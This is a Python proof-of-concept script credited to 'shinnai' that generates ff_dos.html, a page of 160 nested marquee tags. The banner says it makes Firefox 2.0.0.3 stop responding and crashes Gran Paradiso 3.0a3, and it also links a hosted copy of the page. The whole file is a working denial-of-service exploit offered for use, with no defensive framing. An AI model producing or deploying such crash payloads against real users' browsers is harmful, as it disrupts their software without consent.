#usr/bin/python

print "-------------------------------------------------------------------------"
print " Mozilla Firefox 2.0.0.3 and Gran Paradiso 3.0a3 Denial of Service"
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org\n"
print " For convenience I post up a script in python that create a .html file"
print " You can open it locally, upload and browse it or directely browse here:\n"
print " http://www.shinnai.altervista.org/ff_dos.html\n"
print " Firefox 2 stops to answer, Gran Paradiso crahses\n"
print " To avoid confusion, this is based on <marquee> idea but it's not the"
print " same exploit. Take a look here to see differences"
print " http://www.milw0rm.com/exploits/1867"
print "-------------------------------------------------------------------------"

tagHtml = "<html>"
tagHtmlC = "</html>"
tagHead = "<head>"
tagHeadC = "</head>"
tagTitle = "<title>"
tagTitleC = "</title>"

buff= "<marquee>" * 160

boom = tagHtml + buff + tagHead + tagTitle + tagTitleC + tagHeadC + tagHtmlC

try:
   fileOut = open('ff_dos.html','w')
   fileOut.write(boom)
   fileOut.close()
   print "\nFILE ff_dos.html CREATED!\n'NJOY IT...\n"
except:
   print "\nUNABLE TO CREATE FILE ff_dos.html!\n"

